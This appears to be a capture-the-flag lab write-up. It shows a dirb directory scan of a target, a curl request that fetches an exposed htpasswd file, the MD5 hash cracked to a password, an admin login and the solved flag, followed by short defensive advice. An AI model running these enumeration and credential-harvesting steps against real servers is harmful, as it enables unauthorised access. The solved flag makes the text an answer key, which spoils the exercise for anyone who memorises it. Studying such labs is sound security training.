# Full_Path_Disclosure


## Description

https://owasp.org/www-community/attacks/Full_Path_Disclosure

https://www.comparitech.com/blog/information-security/full-path-disclosure-attacks/

A full path disclosure (FPD) attack is pretty well-defined by its name. The attack, if successful, discloses the “full path” to a resource on the web server.

## Attack

	$ dirb http://192.168.1.75                

	-----------------
	DIRB v2.22    
	By The Dark Raver
	-----------------

	START_TIME: Mon Apr  4 16:23:19 2022
	URL_BASE: http://192.168.1.75/
	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

	-----------------

	GENERATED WORDS: 4612                                                          

	---- Scanning URL: http://192.168.1.75/ ----
	==> DIRECTORY: http://192.168.1.75/admin/                                                                         
	==> DIRECTORY: http://192.168.1.75/audio/                                                                         
	==> DIRECTORY: http://192.168.1.75/css/                                                                           
	==> DIRECTORY: http://192.168.1.75/errors/                                                                        
	+ http://192.168.1.75/favicon.ico (CODE:200|SIZE:1406)                                                            
	==> DIRECTORY: http://192.168.1.75/fonts/                                                                         
	==> DIRECTORY: http://192.168.1.75/images/                                                                        
	==> DIRECTORY: http://192.168.1.75/includes/                                                                      
	+ http://192.168.1.75/index.php (CODE:200|SIZE:6892)                                                              
	==> DIRECTORY: http://192.168.1.75/js/                                                                            
	+ http://192.168.1.75/robots.txt (CODE:200|SIZE:53)                                                               
	==> DIRECTORY: http://192.168.1.75/whatever/                                                                      
																													
	---- Entering directory: http://192.168.1.75/admin/ ----
	==> DIRECTORY: http://192.168.1.75/admin/css/                                                                     
	==> DIRECTORY: http://192.168.1.75/admin/fonts/                                                                   
	+ http://192.168.1.75/admin/index.php (CODE:200|SIZE:1432)                                                        
																													
	---- Entering directory: http://192.168.1.75/audio/ ----
																													
	---- Entering directory: http://192.168.1.75/css/ ----
	==> DIRECTORY: http://192.168.1.75/css/images/                                                                    
																													
	---- Entering directory: http://192.168.1.75/errors/ ----
																													
	---- Entering directory: http://192.168.1.75/fonts/ ----
																													
	---- Entering directory: http://192.168.1.75/images/ ----
																													
	---- Entering directory: http://192.168.1.75/includes/ ----
																													
	---- Entering directory: http://192.168.1.75/js/ ----
																													
	---- Entering directory: http://192.168.1.75/whatever/ ----
	+ http://192.168.1.75/whatever/htpasswd (CODE:200|SIZE:38)                                                        
																													
	---- Entering directory: http://192.168.1.75/admin/css/ ----
	==> DIRECTORY: http://192.168.1.75/admin/css/images/                                                              
																													
	---- Entering directory: http://192.168.1.75/admin/fonts/ ----
																													
	---- Entering directory: http://192.168.1.75/css/images/ ----
																													
	---- Entering directory: http://192.168.1.75/admin/css/images/ ----
																													
	-----------------
	END_TIME: Mon Apr  4 16:23:27 2022
	DOWNLOADED: 64568 - FOUND: 5

	$ curl http://192.168.1.75/whatever/htpasswd
	root:8621ffdbc5698829397d97767ac13db3


root:8621ffdbc5698829397d97767ac13db3 -> md5 -> dragon

If we continue exploring the urls we find /admin witch request an admin login
if we try with the access above we find the Flag

The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff


## Defense

Use access control lists (ACL) to limit user access
Never hardcode sentive information
Disallow directory listing